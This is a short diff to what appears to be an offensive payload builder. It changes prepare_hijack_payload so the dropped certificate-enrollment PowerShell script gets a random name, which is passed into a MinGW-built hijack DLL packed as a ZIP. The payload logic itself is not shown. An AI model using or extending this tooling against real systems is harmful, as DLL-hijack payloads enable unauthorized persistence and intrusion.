@@ -223,8 +223,16 @@ def prepare_hijack_payload(
             run_as_user=enroll_run_as_user,
             drop_path=drop_path,
         )
-        (certs_dir / "enroll.ps1").write_text(ps + "\n", encoding="utf-8")
-        build_cert_enroll_dll_mingw(out_path=dll_path, arch=target_arch, drop_path=drop_path)
+        import uuid
+
+        script_name = f"enroll-{uuid.uuid4().hex[:8]}.ps1"
+        (certs_dir / script_name).write_text(ps + "\n", encoding="utf-8")
+        build_cert_enroll_dll_mingw(
+            out_path=dll_path,
+            arch=target_arch,
+            drop_path=drop_path,
+            enroll_script=script_name,
+        )
         zip_path = pack_dll_zip(dll_path, zip_name, payloads_dir)
         print_success(f"enroll payload ZIP → {zip_path}")
         return PayloadBuildResult(
